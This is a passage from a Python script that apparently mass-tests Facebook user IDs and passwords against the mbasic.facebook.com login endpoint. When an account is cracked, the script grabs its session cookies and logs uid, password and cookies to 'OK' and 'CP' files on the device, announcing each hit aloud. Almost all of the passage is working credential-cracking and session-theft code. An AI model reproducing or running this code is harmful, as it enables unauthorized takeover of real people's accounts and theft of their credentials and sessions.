            "accept-encoding":"gzip, deflate br",
            "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				cokii=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()]) 
				os.system('espeak -a 150 " MR DEPRESSION,  Ok,  id"')
				#print(Lin)
				print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mDEPRESSION—OK\x1b[38;5;196m]\033[1;96m»»\033[1;32m {uid} | {pw} \033[1;96m»»\033[1;32m {cokii}    ")
				open('/sdcard/MR-DEPRESSION>OK.txt','a').write(uid+'|'+pw+'|'+cokii+'\n')
				oks.append(uid)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				os.system('espeak -a 300 " Cp,"')
				print (f' \x1b[1;91m[MR-DEPRESSION>CP]\x1b[1;99m '+uid+' > '+pw)
				open('/sdcard/MR-DEPRESSION>CP.txt','a').write(uid+'|'+pw+'\n')
				cps.append(uid)
				#print(Lin)
				break
				
			else:
				
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
    
    
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
#Allah hafez 
